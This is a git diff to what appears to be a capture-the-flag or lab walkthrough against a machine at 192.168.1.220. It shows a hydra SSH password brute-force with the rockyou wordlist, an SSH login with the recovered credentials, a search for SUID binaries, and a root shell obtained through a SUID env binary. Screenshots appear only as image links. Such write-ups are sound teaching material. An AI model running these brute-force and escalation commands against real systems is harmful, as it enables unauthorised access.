@@ -37,8 +37,25 @@ No hidden directories found
 ```bash
 hydra -l dimitri -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.220
 ```
+![image](https://github.com/user-attachments/assets/6db3eaac-d157-4c3f-b565-b93279fb2872)
 
+## **We connect via SSH with the discovered credentials**
+```bash
+ssh dimitri@192.168.1.220
+```
+![image](https://github.com/user-attachments/assets/3e914ff8-aebf-4a7d-97b0-0eba0a1051d5)
 
+## **elevating privileges**
+```bash
+find / -perm -4000 2>/dev/null
+```
+![image](https://github.com/user-attachments/assets/7f411ad0-4835-4b8b-885a-c761c79b1366)
+![image](https://github.com/user-attachments/assets/6261280b-7621-44bb-9f18-d8c5524258e3)
+
+```bash
+/usr/bin/env /bin/sh -p
+```
+![image](https://github.com/user-attachments/assets/60954417-6077-4df9-94c1-a35aa575829e)
 
 
 
